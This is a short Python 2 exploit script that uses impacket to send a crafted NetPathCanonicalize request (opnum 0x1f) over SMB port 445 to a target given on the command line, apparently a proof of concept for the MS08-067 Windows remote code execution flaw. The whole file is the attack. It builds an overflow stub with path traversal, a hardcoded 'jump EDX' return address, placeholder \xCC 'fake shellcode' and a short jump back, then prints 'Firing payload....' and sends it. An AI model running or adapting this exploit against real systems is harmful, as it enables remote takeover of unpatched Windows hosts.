#!/usr/bin/python
#import impacket
#from impacket import *
from impacket import smb
from impacket import uuid
#from impacket.dcerpc import dcerpc
from impacket.dcerpc.v5 import transport
import sys
print "DEBUG: Approaching try-except loop"
try:
	target = sys.argv[1]
	port = 445
except IndexError:
	print "Usage: %s HOST" % sys.argv[0]
	sys.exit()
print "DEBUG: Reached past try-except loop"
trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]'%target)
trans.connect()
dce = trans.DCERPC_class(trans)
dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
stub = '\x01\x00\x00\x00' # reference ID
stub += '\x10\x00\x00\x00' # Max Count
stub += '\x00\x00\x00\x00' # Offset
stub += '\x10\x00\x00\x00' # Actual count
stub += '\x43'*28 # Server UNC
stub += '\x00\x00\x00\x00' # UNC Trailer padding
stub += '\x2f\x00\x00\x00' # Max count
stub += '\x00\x00\x00\x00' # Offset
stub += '\x2f\x00\x00\x00' # Actual count
stub += '\x41\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00\2e\x00\2e\x00\x5c\x00' # PATH
stub += '\x41' * 18 # Padding
stub += '\xb0\x8a\x80\x7c' # 7c808ab0 jump EDX (ffe2)
stub += '\xCC' * 44 # Fake shellcode
stub += '\xEB\xD0\x90\x90' # short jump back
stub += '\x44\x44\x44\x44' # Padding
stub += '\x00\x00'
stub += '\x00\x00\x00\x00' # Padding
stub += '\x02\x00\x00\x00' # Max buf
stub += '\x02\x00\x00\x00' # Max count
stub += '\x00\x00\x00\x00' # Offset
stub += '\x02\x00\x00\x00' # Actual count
stub += '\x5c\x00\x00\x00' # Prefix
stub += '\x01\x00\x00\x00' # Pointer to pathtype
stub += '\x01\x00\x00\x00' # Path type and flags

print "Firing payload...."
dce.call(0x1f, stub) # 0x1f (or 31) - NetPathCanonicalize Operation

